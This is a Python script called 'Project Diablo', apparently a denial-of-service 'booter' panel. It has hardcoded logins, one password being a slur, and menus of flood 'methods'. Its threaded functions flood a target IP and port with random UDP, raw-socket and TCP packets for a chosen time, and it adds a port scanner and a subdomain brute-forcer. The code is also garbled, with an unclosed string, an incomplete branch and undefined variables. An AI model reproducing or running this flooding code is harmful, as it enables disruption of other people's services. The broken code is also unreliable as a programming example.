#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;Project 𝔻𝕚𝕒𝕓𝕝𝕠\x07")
def modifications():
	print ("Contact Skullgetter or Kaz The Net Is Currently Under Maitnance")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
home = """\033[m
╔═𝔻𝕚𝕒𝕓𝕝𝕠══════════════════════════𝔻𝕚𝕒𝕓𝕝𝕠═══════𝔻𝕚𝕒𝕓𝕝𝕠~~~~
║            Ⓓⓘⓐⓑⓛⓞ METHODS                        ║              
║══════════════════════════════════════════════════════║
║ UDP   (IP) (PORT) (TIME) (Methods)   Flood           ║
║                                                      ║
║ HOME  (IP) (PORT) (TIME) (Methods)                   ║
║                                                      ║
║ NUKE (IP) (PORT) (TIME) (Methods)  HOME              ║
║                                                      ║
║ Slap (IP) (PORT) (TIME) (Methods)   Flood3           ║       
║                                                      ║
║ 𝔻𝕚𝕒𝕓𝕝𝕠 (IP) (PORT) (TIME) (Methods)  TCP              ║
╚═𝔻𝕚𝕒𝕓𝕝𝕠════════════════𝔻𝕚𝕒𝕓𝕝𝕠══════════════𝔻𝕚𝕒𝕓𝕝𝕠═══════
Spamming Attacks = Ban
"""
#column:65
Vpn = """\033[m
╔═𝔻𝕚𝕒𝕓𝕝𝕠════════════════════𝔻𝕚𝕒𝕓𝕝𝕠═══════════════════𝔻𝕚𝕒𝕓𝕝𝕠
║             Ⓓⓘⓐⓑⓛⓞ METHODS                      ║║║      
║══════════════════════════════════════════════════════║║
║     RIP   (IP) (PORT) (TIME) (Methods)   RIPv1 ATTACK║║
║                                                      ║║
║ Null  (IP) (PORT) (TIME) (Methods)   Floodv1 ATTACK  ║║
║                                                      ║║
║ NUKE (IP) (PORT) (TIME) (Methods)  Nukev5            ║║
║                                                      ║║
║ VpnNuke (IP) (PORT) (TIME) (Methods)   Vpn3          ║║
║                                                      ║║   
║  KillAllv2 (IP) (PORT) (TIME) (Methods)              ║║                     ║                                                      ║║
║                                                      ║║ 
║                                                      ║║         
╚═𝔻𝕚𝕒𝕓𝕝𝕠════════════════𝔻𝕚𝕒𝕓𝕝𝕠═══════════════𝔻𝕚𝕒𝕓𝕝𝕠═════~~
Spamming Attacks = Ban

banner = """\033[1;00m
 ▓█████▄  ██▓ ▄▄▄       ▄▄▄▄    ██▓     ▒█████  
 ▒██▀ ██▌▓██▒▒████▄    ▓█████▄ ▓██▒    ▒██▒  ██▒
 ░██   █▌▒██▒▒██  ▀█▄  ▒██▒ ▄██▒██░    ▒██░  ██▒
 ░▓█▄   ▌░██░░██▄▄▄▄██ ▒██░█▀  ▒██░    ▒██   ██░
 ░▒████▓ ░██░ ▓█   ▓██▒░▓█  ▀█▓░██████▒░ ████▓▒░
 ▒▒▓  ▒ ░▓   ▒▒   ▓▒█░░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ 
 ░ ▒  ▒  ▒ ░  ▒   ▒▒ ░▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░
 ░ ░  ░  ▒ ░  ░   ▒    ░    ░   ░ ░   ░ ░ ░ ▒  
 ░     ░        ░  ░ ░          ░  ░    ░      
  🇩​​​​​🇮​​​​​🇦​​​​​🇧​​​​​🇱​​​​​🇴​​​​​                                     
Owner @ptv.kaz-_-
Co~Owner Cxmpettive-_-                 
"""


cookie = open("𝔻𝕚𝕒𝕓𝕝𝕠._cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and Udp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;Server (0) | Bots (0) | Owner @ptv.kaz\x07")
		𝔻𝕚𝕒 = input("\033[1;00m[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[1;00m]-\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m ").lower()
		𝔻𝕚𝕒put = 𝔻𝕚𝕒.split(" ")[0]
		if 𝔻𝕚𝕒put == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif 𝔻𝕚𝕒put == "":
			print (help)
			main()
		elif 𝔻𝕚𝕒put == "":
			main()
		elif 𝔻𝕚𝕒put == "exit":
			exit()
		elif 𝔻𝕚𝕒put
                    try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[91m𝔻𝕚𝕒\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif 𝔻𝕚𝕒put == "infoer123":
			print (info)
			main()
		elif 𝔻𝕚𝕒put == "attacks":
			print ("\n[\033[91m𝔻𝕚𝕒\033[00m] UDP Running processes: {}".format (uaid))
			print ("[\033[91m𝔻𝕚𝕒\033[00m] HOME Running processes: {}".format (iaid))
			print ("[\033[91m𝔻𝕚𝕒\033[00m] NUKE Running processes: {}".format (said))
			print ("[\033[91m𝔻𝕚𝕒\033[00m] Total attacks running: {}\n".format (aid))
			
			try:
				host = 𝔻𝕚𝕒.split(" ")[1]
				with open(r"/usr/share//subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("[\033[91m𝔻𝕚𝕒\033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;𝔻𝕚𝕒𝕓𝕝𝕠 |{}| D\x07".format (sfound))
					except socket.error:
						pass
						#print ("[\033[91mSIN\033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
				print ("[\033[91m𝔻𝕚𝕒\033[00m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "resolveer12331333":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mSIN\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "pinger12233333333333333333333333333":
			tpings += 1
			try:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\x07".format (stop))
						print ("𝔻𝕚𝕒𝕓𝕝𝕠: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\x07")
						print ("𝔻𝕚𝕒𝕓𝕝𝕠: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Launched".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "home":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Launched".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "essyn":
			if username == "guests":
				print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Launched".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=synsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "zap":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Launched".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mS𝔻𝕚𝕒\033[00m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all Home attacks")
				icmp = False
				while not icmp:
					print ("[\033[91m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] No Home processes running")
					udp = True
					main()
		else:
			print ("[\033[91m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] {} Not a command".format(sinput))
			main()



try:
	users = ["Ace", "guests"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username (Enter Username): ")
	if username in users:
		user = username
	else:
		print ("Login Incorrect")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["OrbitsKaz", "gayman"]
	password = getpass.getpass ("[+] Password (Enter Password): ")
	if user == "Ace":
		if password == passwords[0]:
			print ("Login Successful")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[90m@Project𝔻𝕚𝕒𝕓𝕝𝕠\033[00m] CTRL has been pressed")
				main()
		else:
			print ("Login Incorrect")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91m𝔻𝕚𝕒\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()